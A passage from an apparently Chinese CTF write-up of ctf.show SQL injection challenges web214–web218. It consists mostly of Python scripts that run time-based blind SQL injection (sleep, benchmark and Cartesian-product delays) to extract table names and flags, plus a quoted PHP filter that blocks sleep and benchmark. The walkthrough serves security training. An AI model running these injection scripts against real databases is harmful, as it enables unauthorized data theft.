</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web215">web215<a hidden class="anchor" aria-hidden="true" href="#web215">#</a></h4>
<p><img alt="image-20250214121007384" loading="lazy" src="./assets/image-20250214121007384.png"></p>
<p>上题脚本改一改</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># payload = &#34;select flaga from ctfshow_flagx&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1&#39; or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web216">web216<a hidden class="anchor" aria-hidden="true" href="#web216">#</a></h4>
<p><img alt="image-20250214122109700" loading="lazy" src="./assets/image-20250214122109700.png"></p>
<p>构造闭合即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxcc&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaac from ctfshow_flagxcc&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;&#39;&#39;) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web217">web217<a hidden class="anchor" aria-hidden="true" href="#web217">#</a></h4>
<p><img alt="image-20250214145642775" loading="lazy" src="./assets/image-20250214145642775.png"></p>
<p>这题waf了sleep</p>
<p>可以改用benchmark</p>
<blockquote>
<ul>
<li>在 MySQL 中，<code>benchmark</code>函数用于测试表达式执行的性能。它的语法是<code>benchmark(count,expr)</code>，其中<code>count</code>是要执行<code>expr</code>的次数，<code>expr</code>是要测试的表达式。</li>
<li>例如，<code>benchmark(10000000,sha(1))</code>表示将<code>sha(1)</code>这个表达式执行 10000000 次。<code>sha(1)</code>是计算字符串<code>'1'</code>的 SHA - 1 哈希值。</li>
</ul></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># 查列名字</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxccb&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># 查数据</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flagxccb&#34;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,benchmark(1000000,sha(1)),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.33</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>benchmark的设置比较苛刻，要多试试</p>
<p>最好不要设置太大，环境会崩</p>
<h4 id="web218">web218<a hidden class="anchor" aria-hidden="true" href="#web218">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">       <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="c1">//屏蔽危险分子
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"></span>    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/sleep|benchmark/i&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>   
</span></span><span class="line"><span class="ln">11</span><span class="cl">      
</span></span></code></pre></div><p>这题sleep和benchmark都被ban掉了</p>
<p>可以考虑用笛卡尔积盲注</p>
<p>参考文章：<a href="https://cloud.tencent.com/developer/article/1601686">SQL注入经验-大负荷注入-腾讯云开发者社区-腾讯云</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaac from ctfshow_flagxc&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
